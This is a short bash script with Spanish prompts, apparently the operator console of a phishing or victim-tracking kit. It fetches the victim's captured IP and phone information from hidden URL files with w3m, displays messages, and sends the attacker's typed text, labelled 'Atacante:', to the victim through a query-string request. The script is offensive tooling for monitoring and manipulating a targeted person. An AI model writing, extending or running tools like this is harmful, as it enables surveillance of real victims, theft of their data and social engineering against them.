# $fa = fopen("list.txt", "w+");
#        fwrite($fa,"");
#        fclose($fa);

bash .banner

a=$(cat .ip)
b=$(cat .cel)
c=$(cat .list)
d=$(cat .lise)

echo "Informacion:"
echo ""
w3m -dump $a
echo ""
w3m -dump $b
echo ""
echo "Mensajes:"
echo ""
w3m -dump $d

echo ""
echo "Introduce el mensaje para chatear con la victima:"
read msg

HAT=Atacante: 
USER_AGENT=Google

w3m -dump $c?name=$HAT$msg

bash .ls

